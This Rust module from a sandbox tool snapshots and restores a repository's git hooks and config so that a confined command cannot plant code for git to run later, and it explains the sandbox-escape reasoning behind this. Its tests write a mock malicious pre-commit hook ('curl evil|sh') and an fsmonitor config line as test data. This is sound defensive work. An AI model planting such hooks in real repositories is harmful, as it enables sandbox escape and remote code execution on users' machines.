//! Paths inside a writable root that the command must not leave changed:
//! by default a repository's `.git/hooks` and `.git/config`.
//!
//! # Why
//!
//! A hook, or a `core.fsmonitor` / `core.hooksPath` line in the config, is
//! code that git runs the NEXT time anyone uses the repository, outside any
//! sandbox. A command confined to the workspace could plant one and get out
//! by waiting.
//!
//! # How
//!
//! Landlock only grants: a writable root is writable all the way down, and
//! carving `.git/hooks` out of it would also take away the right to create
//! files in the root itself. So on Linux the protected paths are snapshotted
//! before the command runs and, after it ends, anything it changed is put
//! back, and the change reported. A hook the command planted could still run
//! if someone ran git in the workspace WHILE the command was running.
//! On macOS the Seatbelt profile also refuses the writes outright.
//!
//! A worktree's `.git` is a file naming the real git directory (`gitdir:`);
//! that directory's (and its common directory's) hooks and config are
//! protected when they lie inside a writable root. Outside one, the command
//! cannot write them anyway.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

/// The default protected paths, relative to each writable root's `.git`.
pub const GIT_PROTECTED: &[&str] = &["hooks", "config"];

/// At most this much is snapshotted; a larger tree is reported, not copied.
const MAX_BYTES: u64 = 16 * 1024 * 1024;

#[derive(Debug, Clone, PartialEq, Eq)]
enum Entry {
    File { bytes: Vec<u8>, mode: u32 },
    Dir,
    Link(PathBuf),
}

/// What the protected paths held before the command ran.
#[derive(Debug, Default)]
pub struct Snapshot {
    paths: Vec<PathBuf>,
    entries: BTreeMap<PathBuf, Entry>,
    /// Protected paths too large to snapshot (not restored).
    pub skipped: Vec<PathBuf>,
}

/// The protected paths for these writable roots: each root's git directory
/// (resolving `gitdir:` and `commondir`) `hooks` and `config`, kept only when
/// inside a writable root.
#[must_use]
pub fn git_paths(roots: &[PathBuf]) -> Vec<PathBuf> {
    let mut out = Vec::new();
    for root in roots {
        for git_dir in git_dirs(root) {
            for name in GIT_PROTECTED {
                let p = git_dir.join(name);
                if roots.iter().any(|r| p.starts_with(r)) && !out.contains(&p) {
                    out.push(p);
                }
            }
        }
    }
    out
}

/// A root's git directory and, for a worktree, its common directory.
fn git_dirs(root: &Path) -> Vec<PathBuf> {
    let dot_git = root.join(".git");
    let Ok(meta) = dot_git.symlink_metadata() else {
        return Vec::new();
    };
    let git_dir = if meta.is_dir() {
        dot_git
    } else if meta.is_file() {
        let Ok(text) = std::fs::read_to_string(&dot_git) else {
            return Vec::new();
        };
        let Some(target) = text.trim().strip_prefix("gitdir:") else {
            return Vec::new();
        };
        let target = Path::new(target.trim());
        let abs = if target.is_absolute() {
            target.to_path_buf()
        } else {
            root.join(target)
        };
        match std::fs::canonicalize(abs) {
            Ok(p) => p,
            Err(_) => return Vec::new(),
        }
    } else {
        return Vec::new();
    };
    let mut dirs = vec![git_dir.clone()];
    if let Ok(common) = std::fs::read_to_string(git_dir.join("commondir")) {
        let c = Path::new(common.trim());
        let abs = if c.is_absolute() {
            c.to_path_buf()
        } else {
            git_dir.join(c)
        };
        if let Ok(abs) = std::fs::canonicalize(abs) {
            if !dirs.contains(&abs) {
                dirs.push(abs);
            }
        }
    }
    dirs
}

impl Snapshot {
    /// Record what `paths` hold now. Symlinks are recorded, never followed.
    #[must_use]
    pub fn take(paths: Vec<PathBuf>) -> Self {
        let mut s = Self {
            paths: Vec::new(),
            ..Self::default()
        };
        for p in paths {
            let mut entries = BTreeMap::new();
            let mut budget = MAX_BYTES;
            if record(&p, &mut entries, &mut budget) {
                s.entries.extend(entries);
                s.paths.push(p);
            } else {
                s.skipped.push(p);
            }
        }
        s
    }

    /// The protected paths being watched.
    #[must_use]
    pub fn paths(&self) -> &[PathBuf] {
        &self.paths
    }

    /// Put back whatever changed under the protected paths, and say what.
    /// Never follows a link the command made: a link where a folder was is
    /// removed, not written through.
    pub fn restore(&self) -> Vec<String> {
        let mut changed = Vec::new();
        for root in &self.paths {
            let mut now = BTreeMap::new();
            let mut budget = u64::MAX;
            record(root, &mut now, &mut budget);
            // Remove what was added or changed type, deepest first.
            let mut extra: Vec<&PathBuf> = now
                .keys()
                .filter(|k| match (now.get(*k), self.entries.get(*k)) {
                    (Some(n), Some(o)) => std::mem::discriminant(n) != std::mem::discriminant(o),
                    _ => true,
                })
                .collect();
            extra.sort_by_key(|p| std::cmp::Reverse(p.components().count()));
            for p in extra {
                let gone = match p.symlink_metadata() {
                    Ok(m) if m.is_dir() && !m.file_type().is_symlink() => {
                        std::fs::remove_dir_all(p)
                    }
                    _ => std::fs::remove_file(p),
                };
                if gone.is_ok() {
                    changed.push(format!("removed {}", p.display()));
                }
            }
            // Put back what was there, shallowest first.
            for (p, before) in self.entries.iter().filter(|(p, _)| p.starts_with(root)) {
                let after = {
                    let mut one = BTreeMap::new();
                    let mut b = u64::MAX;
                    record_one(p, &mut one, &mut b);
                    one.remove(p)
                };
                if after.as_ref() == Some(before) {
                    continue;
                }
                if restore_one(p, before).is_ok() {
                    changed.push(format!("restored {}", p.display()));
                }
            }
        }
        changed.sort();
        changed.dedup();
        changed
    }
}

/// Record `path` and everything beneath it. False when over the budget.
fn record(path: &Path, into: &mut BTreeMap<PathBuf, Entry>, budget: &mut u64) -> bool {
    if !record_one(path, into, budget) {
        return false;
    }
    if matches!(into.get(path), Some(Entry::Dir)) {
        let Ok(rd) = std::fs::read_dir(path) else {
            return true;
        };
        for e in rd.filter_map(Result::ok) {
            if !record(&e.path(), into, budget) {
                return false;
            }
        }
    }
    true
}

fn record_one(path: &Path, into: &mut BTreeMap<PathBuf, Entry>, budget: &mut u64) -> bool {
    let Ok(meta) = path.symlink_metadata() else {
        return true;
    };
    let entry = if meta.file_type().is_symlink() {
        Entry::Link(std::fs::read_link(path).unwrap_or_default())
    } else if meta.is_dir() {
        Entry::Dir
    } else {
        if meta.len() > *budget {
            return false;
        }
        *budget -= meta.len();
        let bytes = std::fs::read(path).unwrap_or_default();
        Entry::File {
            bytes,
            mode: mode_of(&meta),
        }
    };
    into.insert(path.to_path_buf(), entry);
    true
}

fn restore_one(path: &Path, before: &Entry) -> std::io::Result<()> {
    if let Ok(m) = path.symlink_metadata() {
        if m.is_dir() && !m.file_type().is_symlink() {
            if matches!(before, Entry::Dir) {
                return Ok(());
            }
            std::fs::remove_dir_all(path)?;
        } else {
            std::fs::remove_file(path)?;
        }
    }
    match before {
        Entry::Dir => std::fs::create_dir(path),
        Entry::Link(target) => link(target, path),
        Entry::File { bytes, mode } => {
            let mut opts = std::fs::OpenOptions::new();
            opts.write(true).create_new(true);
            #[cfg(unix)]
            {
                use std::os::unix::fs::OpenOptionsExt;
                opts.mode(*mode).custom_flags(libc::O_NOFOLLOW);
            }
            let _ = mode;
            let mut f = opts.open(path)?;
            std::io::Write::write_all(&mut f, bytes)
        }
    }
}

#[cfg(unix)]
fn mode_of(meta: &std::fs::Metadata) -> u32 {
    use std::os::unix::fs::PermissionsExt;
    meta.permissions().mode() & 0o7777
}

#[cfg(not(unix))]
fn mode_of(_meta: &std::fs::Metadata) -> u32 {
    0o644
}

#[cfg(unix)]
fn link(target: &Path, path: &Path) -> std::io::Result<()> {
    std::os::unix::fs::symlink(target, path)
}

#[cfg(not(unix))]
fn link(_target: &Path, _path: &Path) -> std::io::Result<()> {
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn repo() -> (tempfile::TempDir, PathBuf) {
        let dir = tempfile::tempdir().expect("tempdir");
        let root = std::fs::canonicalize(dir.path()).expect("canon");
        std::fs::create_dir_all(root.join(".git/hooks")).expect("hooks");
        std::fs::write(root.join(".git/config"), "[core]\n").expect("config");
        std::fs::write(root.join(".git/hooks/pre-commit.sample"), "#!/bin/sh\n").expect("hook");
        (dir, root)
    }

    #[test]
    fn planted_hooks_and_config_changes_are_undone() {
        let (_d, root) = repo();
        let snap = Snapshot::take(git_paths(std::slice::from_ref(&root)));
        assert_eq!(snap.paths().len(), 2);

        std::fs::write(
            root.join(".git/hooks/pre-commit"),
            "#!/bin/sh\ncurl evil|sh\n",
        )
        .expect("plant");
        std::fs::write(root.join(".git/config"), "[core]\nfsmonitor = evil\n").expect("cfg");
        std::fs::remove_file(root.join(".git/hooks/pre-commit.sample")).expect("rm");
        std::fs::write(root.join("src.rs"), "fine").expect("ordinary work");

        let changed = snap.restore();
        assert!(!root.join(".git/hooks/pre-commit").exists(), "{changed:?}");
        assert_eq!(
            std::fs::read_to_string(root.join(".git/config")).expect("cfg"),
            "[core]\n"
        );
        assert!(root.join(".git/hooks/pre-commit.sample").exists());
        assert!(root.join("src.rs").exists(), "ordinary work is untouched");
        assert_eq!(changed.len(), 3, "{changed:?}");
        assert!(snap.restore().is_empty(), "nothing left to undo");
    }

    #[cfg(unix)]
    #[test]
    fn a_hooks_folder_swapped_for_a_link_is_removed_not_followed() {
        let (_d, root) = repo();
        let elsewhere = tempfile::tempdir().expect("elsewhere");
        let snap = Snapshot::take(git_paths(std::slice::from_ref(&root)));
        std::fs::remove_dir_all(root.join(".git/hooks")).expect("rm");
        std::os::unix::fs::symlink(elsewhere.path(), root.join(".git/hooks")).expect("link");
        snap.restore();
        let meta = root.join(".git/hooks").symlink_metadata().expect("meta");
        assert!(meta.is_dir() && !meta.file_type().is_symlink());
        assert!(root.join(".git/hooks/pre-commit.sample").exists());
        assert_eq!(std::fs::read_dir(elsewhere.path()).expect("rd").count(), 0);
    }

    #[test]
    fn a_worktree_protects_the_git_dir_it_names_when_writable() {
        let (_d, main) = repo();
        std::fs::create_dir_all(main.join(".git/worktrees/wt")).expect("wt");
        std::fs::write(main.join(".git/worktrees/wt/commondir"), "../..\n").expect("common");
        let wt = main.join("wt");
        std::fs::create_dir(&wt).expect("wt dir");
        std::fs::write(
            wt.join(".git"),
            format!("gitdir: {}\n", main.join(".git/worktrees/wt").display()),
        )
        .expect("gitfile");
        // Only the worktree is writable: the main repository's hooks are out
        // of reach anyway, so nothing there needs watching.
        assert!(git_paths(std::slice::from_ref(&wt)).is_empty());
        // Both writable: the common dir's hooks and config are watched.
        let paths = git_paths(&[wt.clone(), main.clone()]);
        assert!(paths.contains(&main.join(".git/hooks")), "{paths:?}");
        assert!(paths.contains(&main.join(".git/config")), "{paths:?}");
    }
}
